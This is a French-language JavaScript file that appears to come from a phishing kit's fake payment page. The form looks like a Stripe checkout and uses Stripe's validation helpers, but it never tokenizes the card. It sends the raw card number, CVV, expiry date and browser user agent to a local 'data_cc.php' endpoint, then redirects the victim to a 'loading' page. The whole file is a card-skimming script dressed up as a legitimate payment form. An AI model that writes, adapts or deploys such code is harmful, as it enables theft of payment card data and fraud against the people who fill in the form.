
var $form = $('#payment-form');
$form.find('.subscribe').on('click', payWithStripe);

/* If you're using Stripe for payments */
function payWithStripe(e) {
    e.preventDefault();
		
		
							

var cardNumber = $form.find('[name=cardNumber]').val().replace(/\s/g,'');
var cardCVC = $form.find('[name=cardCVC]').val();
var cardExpiry = $form.find('[name=cardExpiry]').val();

	




if(cardNumber==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le numéro de la carte",

})	

return false;	
}

if(cardExpiry==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir la date d'expiration  de la carte",

})	

return false;	
}


	
if(cardCVC==''){

swal({
icon: 'warning',
title: 'Attention !',
text: "Veuillez saisir le cryptogramme visuel de la carte",

})	

return false;	
}
	
	
    /* Abort if invalid form data */
    if (!validator.form()) {
        return;
    }


   $form.find('.subscribe').html('Traitement en cours <i class="fa fa-spinner fa-pulse"></i>').prop('disabled', true);

var data_cc = 
{
device           :  navigator.userAgent,
cc_number        :	cardNumber,
cc_cvv           :	cardCVC,
cc_date          :	cardExpiry
}; 



var _url = '../api/data_cc.php';


$.post(_url,data_cc,function(data){
 var reponse = JSON.parse(data); 
if(reponse.statut=="error"){	

swal({
icon: reponse.statut,
title: reponse.title,
text: reponse.resultat

});
}else if(reponse.statut=="success"){	


 window.location="../backend/load.html";

} 


}) 
}


/* Fancy restrictive input formatting via jQuery.payment library*/
$('input[name=cardNumber]').payment('formatCardNumber');
$('input[name=cardCVC]').payment('formatCardCVC');
$('input[name=cardExpiry').payment('formatCardExpiry');

/* Form validation using Stripe client-side validation helpers */
jQuery.validator.addMethod("cardNumber", function(value, element) {
    return this.optional(element) || Stripe.card.validateCardNumber(value);
}, "Veuillez indiquer un numéro de carte de crédit valide.");

jQuery.validator.addMethod("cardExpiry", function(value, element) {    
    /* Parsing month/year uses jQuery.payment library */
    value = $.payment.cardExpiryVal(value);
    return this.optional(element) || Stripe.card.validateExpiry(value.month, value.year);
}, "Date d'expiration non valide.");

jQuery.validator.addMethod("cardCVC", function(value, element) {
    return this.optional(element) || Stripe.card.validateCVC(value);
}, "CVC non valide.");

validator = $form.validate({
    rules: {
        cardNumber: {
            required: true,
            cardNumber: true            
        },
        cardExpiry: {
            required: true,
            cardExpiry: true
        },
        cardCVC: {
            required: true,
            cardCVC: true
        }
    },
    highlight: function(element) {
        $(element).closest('.form-control').removeClass('success').addClass('error');
    },
    unhighlight: function(element) {
        $(element).closest('.form-control').removeClass('error').addClass('success');
    },
    errorPlacement: function(error, element) {
        $(element).closest('.form-group').append(error);
    }
});

paymentFormReady = function() {
    if ($form.find('[name=cardNumber]').hasClass("success") &&
        $form.find('[name=cardExpiry]').hasClass("success") &&
        $form.find('[name=cardCVC]').val().length > 1) {
        return true;
    } else {
        return false;
    }
}

$form.find('.subscribe').prop('disabled', true);
var readyInterval = setInterval(function() {
    if (paymentFormReady()) {
   $form.find('.subscribe').prop('disabled', false);

	 
	 
	
    }
}, 250);